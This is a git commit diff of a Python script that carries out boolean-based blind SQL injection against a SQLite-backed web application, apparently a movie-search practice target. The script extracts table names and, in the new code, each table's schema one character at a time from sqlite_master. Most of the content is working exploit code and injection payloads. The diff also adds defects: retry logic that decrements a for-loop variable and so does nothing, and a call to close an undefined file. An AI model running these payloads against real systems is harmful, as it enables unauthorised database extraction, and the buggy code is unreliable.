92f977060b3c60410eb06610610271bd6a711282
kyoungseokKim <0xe82de@gmail.com>
2020-10-30 16:16:16 +0900

    SQL_Injection-Blind (SQLite) update 2020-10-30

--- py/SQL_Injection-Blind_(SQLite).py
+++ py/SQL_Injection-Blind_(SQLite).py
@@ -3,9 +3,11 @@
 
 import requests
 
-def GetTables(urlTarget, cookies):
+def GetTables(urlTarget, cookies):  
   tables = []
+  sqls = {}
   tempTable = ""
+  tempSql = ""
   cntTables = 0
   checkEof = 0
   countTable = 1
@@ -18,28 +20,43 @@ def GetTables(urlTarget, cookies):
           "action": "search"
         }
 
+
         r = requests.get(urlTarget, params=paramsTarget, cookies=cookies)
       
+      except OSError as e:
+        i -= 1
+        continue
+
       except Exception as e:
         print(e)
-        print("[Length] Error...")
+        print("[Length of table's name] Error...")
         exit(1)
 
       if 'The movie exists in our database!' in r.text:
         ## 테이블 길이를 알아냈으니 테이블 명 추측.
         for j in range(1, i+1):
-          for k in range(32, 128): ## Ascii code
+          for k in range(32, 127): ## Ascii code
             try:
-              paramsTarget = {
-                "title": "' or 1 and substr((select tbl_name from sqlite_master limit " + str(countTable) + ", 1), " + str(j) + ", 1)=\"" + chr(k) + "\"--",
-                "action": "search"
-              }
+              if k != 34:
+                paramsTarget = {
+                  "title": "' or 1 and substr((select tbl_name from sqlite_master limit " + str(countTable) + ", 1), " + str(j) + ", 1)=\"" + chr(k) + "\"--",
+                  "action": "search"
+                }
+              else:
+                paramsTarget = {
+                  "title": "' or 1 and substr((select tbl_name from sqlite_master limit " + str(countTable) + ", 1), " + str(j) + ", 1)=\"\"\"--",
+                  "action": "search"
+                }
 
               r = requests.get(urlTarget, params=paramsTarget, cookies=cookies)
 
+            except OSError as e:
+              k -= 1
+              continue
+
             except Exception as e:
               print(e)
-              print("[Table] Error...")
+              print("[table's name] Error...")
               exit(1)
             
             if 'The movie exists in our database!' in r.text:
@@ -48,15 +65,70 @@ def GetTables(urlTarget, cookies):
               break
 
         tables.append(tempTable)
+
+        ## length of sql column
+        for x in range(1, 501):
+          try:
+            paramsTarget = {
+              "title": "' or 1 and length((select sql from sqlite_master where tbl_name=\"" + tempTable + "\"))=" + str(x) + "--",
+              "action": "search"
+            }
+
+            r = requests.get(urlTarget, params=paramsTarget, cookies=cookies)
+
+          except OSError as e:
+            x -= 1
+            continue
+
+          except Exception as e:
+            print(e)
+            print("[Length of sql column] Error...")
+            exit(1)
+
+          if 'The movie exists in our database!' in r.text:
+            for y in range(1, x+1):
+              for z in range(32, 127): ## Ascii code
+                try:
+                  if z != 34:
+                    paramsTarget = {
+                      "title": "' or 1 and substr((select sql from sqlite_master where tbl_name=\"" + tempTable + "\"), " + str(y) + ", 1)=\"" + chr(z) + "\"--",
+                      "action": "search"
+                    }
+                  else:
+                    paramsTarget = {
+                      "title": "' or 1 and substr((select sql from sqlite_master where tbl_name=\"" + tempTable + "\"), " + str(y) + ", 1)=\"\"\"--",
+                      "action": "search"
+                    }
+
+                  r = requests.get(urlTarget, params=paramsTarget, cookies=cookies)
+
+                except OSError as e:
+                  z -= 1
+                  continue
+                  
+                except Exception as e:
+                  print(e)
+                  print("[sql column] Error...")
+                  exit(1)
+
+                if 'The movie exists in our database!' in r.text:
+                  tempSql += chr(z)
+                  
+                  break
+
+            sqls[tempTable] = tempSql
+
         tempTable = ""
+        tempSql = ""
         countTable += 1;
         break; # 테이블명 알아내고 다음 테이블
 
       else: ## False
         if (i == 10): ## sqlite 테이블명 길이가 최대 10이라고 가정하고, 길이 10까지 DB에 존재하지 않으면 모든 테이블 확인한 것으로 추측
-          return tables, countTable
+          return tables, countTable, sqls
         
         continue;
+  f.close()
 
 def GetCookies(urlLogin, paramsLogin):
   try:
@@ -87,7 +159,8 @@ if __name__=="__main__":
 
   print("Search for a table. It takes a long time if there are a lot of tables.\n")
   #GetTables(urlTarget, cookies)
-  tables, cntTables = GetTables(urlTarget, cookies)
+  tables, cntTables, sqls = GetTables(urlTarget, cookies)
   print("## SQLite tables ##")
   print(tables)
   print("")
+  print(sqls)
